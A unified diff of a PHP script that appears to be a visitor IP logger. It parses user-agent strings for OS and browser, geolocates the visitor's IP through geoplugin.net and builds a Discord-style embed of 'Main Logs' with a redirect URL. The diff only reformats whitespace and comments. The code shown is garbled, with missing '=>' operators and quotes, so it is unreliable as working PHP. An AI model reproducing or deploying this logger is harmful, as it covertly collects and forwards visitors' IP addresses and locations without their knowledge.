@@ -12,7 +12,7 @@ function getOS() {
     global $user_agent;
     $os_platform    =   Unknown OS;
     $os_array       =   array(
-                            'windows nt 10i'     =  'Windows 10',
+                            'windows nt 10i'      =  'Windows 10',
                             'windows nt 6.3i'     =  'Windows 8.1',
                             'windows nt 6.2i'     =  'Windows 8',
                             'windows nt 6.1i'     =  'Windows 7',
@@ -25,10 +25,10 @@ function getOS() {
                             'win98i'              =  'Windows 98',
                             'win95i'              =  'Windows 95',
                             'win16i'              =  'Windows 3.11',
-                            'macintoshmac os xi' =  'Mac OS X',
+                            'macintoshmac os xi'  =  'Mac OS X',
                             'mac_powerpci'        =  'Mac OS 9',
                             'linuxi'              =  'Linux',
-							'kalilinuxi'          =  'KaliLinux',
+			    'kalilinuxi'          =  'KaliLinux',
                             'ubuntui'             =  'Ubuntu',
                             'iphonei'             =  'iPhone',
                             'ipodi'               =  'iPod',
@@ -36,7 +36,7 @@ function getOS() {
                             'androidi'            =  'Android',
                             'blackberryi'         =  'BlackBerry',
                             'webosi'              =  'Mobile',
-							'Windows Phonei'      =  'Windows Phone'
+			    'Windows Phonei'      =  'Windows Phone'
                         );
     foreach ($os_array as $regex = $value) {
         if (preg_match($regex, $user_agent)) {
@@ -51,18 +51,18 @@ function getBrowser() {
     $browser_array  =   array(
                             'msiei'       =  'Internet Explorer',
                             'firefoxi'    =  'Firefox',
-							'Mozillai'	=	'Mozila',
-							'Mozilla5.0i'=	'Mozila',
+			    'Mozillai'	  =  'Mozila',
+			    'Mozilla5.0i' =  'Mozila',
                             'safarii'     =  'Safari',
                             'chromei'     =  'Chrome',
                             'edgei'       =  'Edge',
                             'operai'      =  'Opera',
-							'OPRi'        =  'Opera',
+			    'OPRi'        =  'Opera',
                             'netscapei'   =  'Netscape',
                             'maxthoni'    =  'Maxthon',
                             'konquerori'  =  'Konqueror',
-							'Boti'		=	'Robot',
-							'Valve Steam GameOverlayi'  =  'Steam',
+			    'Boti'	  =	'Robot',
+			    'Valve Steam GameOverlayi'  =  'Steam',
                             'mobilei'     =  'Mobile'
                         );
     foreach ($browser_array as $regex = $value) {
@@ -86,12 +86,12 @@ else{
 	}
 
 $ip_address=$_SERVER['REMOTE_ADDR'];
-Get user ip address details with geoplugin.net
+//Get user ip address details with geoplugin.net
 $geopluginURL='http://www.geoplugin.net/php.gp?ip='.$ip_address;
 $addrDetailsArr = unserialize(file_get_contents($geopluginURL));
-Get City name by return array
+//Get City name by return array
 $city = $addrDetailsArr['geoplugin_city'];
-Get Country name by return array
+//Get Country name by return array
 $country = $addrDetailsArr['geoplugin_countryName'];
 $state = $addrDetailsArr['geoplugin_regionCode'];
 $long = $addrDetailsArr['geoplugin_longitude'];
@@ -102,7 +102,7 @@ $ping = $addrDetailsArr['geoplugin_delay'];
 
 $whatmyipaddress = https://whatismyipaddress.com/ip/$ip;
 $checkhost = https://check-host.net/check-ping/host=$ip;
-Comment out these line to see all the posible details
+//Comment out these line to see all the posible details
 echo 'pre';
 print_r($addrDetailsArr);
 die();
@@ -120,31 +120,31 @@ else {
     content = $tags_hvh,
   embeds = [
       [
-           Set the title for your embed
+           //Set the title for your embed
           title = $site_name Main Logs,
 
-           The type of your embed, will ALWAYS be rich
+          // The type of your embed, will ALWAYS be rich
           type = rich,
 
-           A description for your embed
+        //   A description for your embed
           description = ,
 
-           The URL of where your title will be a link to
+          // The URL of where your title will be a link to
           url = $redirect,
 
-           A timestamp to be displayed below the embed, IE for when an an article was posted
-            This must be formatted as ISO8601
+          // A timestamp to be displayed below the embed, IE for when an an article was posted
+          //  This must be formatted as ISO8601
 
 
-           The integer color to be used on the left side of the embed
+          // The integer color to be used on the left side of the embed
           color = hexdec( FFFFFF ),
 
-           Footer object
+         //  Footer object
           footer = [
               text = "Logged at: $time"
               icon_url = "https://www.creativefabrica.com/wp-content/uploads/2019/02/Monogram-IP-Logo-Design-by-Greenlines-Studios.jpg"
           ],
-           Field array of objects
+          // Field array of objects
           fields = [
                Field 1
               [
